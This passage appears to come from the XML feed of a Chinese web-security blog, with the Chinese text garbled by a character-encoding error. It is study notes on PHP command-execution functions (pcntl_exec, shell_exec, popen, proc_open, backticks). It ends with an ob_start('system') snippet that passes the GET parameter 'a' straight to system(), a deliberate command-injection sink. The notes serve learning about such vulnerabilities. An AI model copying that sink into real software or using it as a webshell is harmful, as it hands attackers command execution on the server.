]] )</span><br></pre></td></tr></table></figure><p>pathæ˜¯å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº† ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬<br>argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">pcntl_exec ( <span class="string">"/bin/ls"</span> ,[<span class="string">"/"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'123'</span>;    <span class="comment">//ä¸ä¼šæ‰§è¡Œåˆ°è¯¥è¡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string shell_exec ( string $cmd )</span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( string $command , string $mode ) : resource</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$test = <span class="string">"ls /tmp/test"</span>;  </span><br><span class="line">$fp = popen($test,<span class="string">"r"</span>);  <span class="comment">//popenæ‰“ä¸€ä¸ªè¿›ç¨‹é€šé“  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;      <span class="comment">//ä»é€šé“é‡Œé¢å–å¾—ä¸œè¥¿  </span></span><br><span class="line"> $out = fgets($fp, <span class="number">4096</span>);  </span><br><span class="line"> <span class="keyword">echo</span>  $out;         <span class="comment">//æ‰“å°å‡ºæ¥  </span></span><br><span class="line">&#125;  </span><br><span class="line">pclose($fp);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = <span class="string">"ls /"</span>;</span><br><span class="line">$array =   [</span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"r"</span>],   <span class="comment">//æ ‡å‡†è¾“å…¥</span></span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"w"</span>],   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹</span></span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"w"</span>]    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$fp = proc_open($test,$array,$pipes);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“</span></span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($pipes[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹</span></span><br><span class="line">proc_close($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="`(åå¼•å·)"></a>`(åå¼•å·)</h3><p>åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼Œä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œ`â€çš„æ•ˆæœä¸å‡½æ•° shell_exec() ç›¸åŒã€‚</p><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><p>æ­¤å‡½æ•°å°†æ‰“å¼€è¾“å‡ºç¼“å†²ã€‚å½“è¾“å‡ºç¼“å†²æ¿€æ´»åï¼Œè„šæœ¬å°†ä¸ä¼šè¾“å‡ºå†…å®¹ï¼ˆé™¤httpæ ‡å¤´å¤–ï¼‰ï¼Œç›¸åéœ€è¦è¾“å‡ºçš„å†…å®¹è¢«å­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚æƒ³è¦è¾“å‡ºå­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ ob_end_flush() å‡½æ•°ã€‚</p><p>å¯é€‰å‚æ•° output_callback å‡½æ•°å¯ä»¥è¢«æŒ‡å®šã€‚ æ­¤å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œå‚æ•°å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ å½“è¾“å‡ºç¼“å†²åŒºè¢«( ob_flush(), ob_clean() æˆ–è€…ç›¸ä¼¼çš„å‡½æ•°)å†²åˆ·ï¼ˆé€å‡ºï¼‰æˆ–è€…è¢«æ¸…æ´—çš„æ—¶å€™ï¼›æˆ–è€…åœ¨è¯·æ±‚ç»“æŸä¹‹é™…è¾“å‡ºç¼“å†²åŒºå†…å®¹è¢«å†²åˆ·åˆ°æµè§ˆå™¨çš„æ—¶å€™è¯¥å‡½æ•°å°†ä¼šè¢«è°ƒç”¨ã€‚ å½“è°ƒç”¨ output_callback æ—¶ï¼Œå®ƒå°†æ”¶åˆ°è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ä½œä¸ºå‚æ•° å¹¶é¢„æœŸè¿”å›ä¸€ä¸ªæ–°çš„è¾“å‡ºç¼“å†²åŒºä½œä¸ºç»“æœï¼Œè¿™ä¸ªæ–°è¿”å›çš„è¾“å‡ºç¼“å†²åŒºå†…å®¹å°†è¢«é€åˆ°æµè§ˆå™¨ã€‚</p><p>ä¸‹é¢çš„ä»£ç ï¼Œç”±äºè°ƒç”¨äº†ob_end_flush()ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ob_start($cmd)ä¸­çš„cmdï¼ŒæŠŠæˆ‘ä»¬è¾“å…¥çš„$_GET[a]ä½œä¸ºcmdçš„å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'system'</span>;</span><br><span class="line">ob_start($cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´&lt;/p&gt;
&lt;p&gt;å­¦ä¹ phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ²¡æœ‰æ–°å§¿åŠ¿&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
</feed>
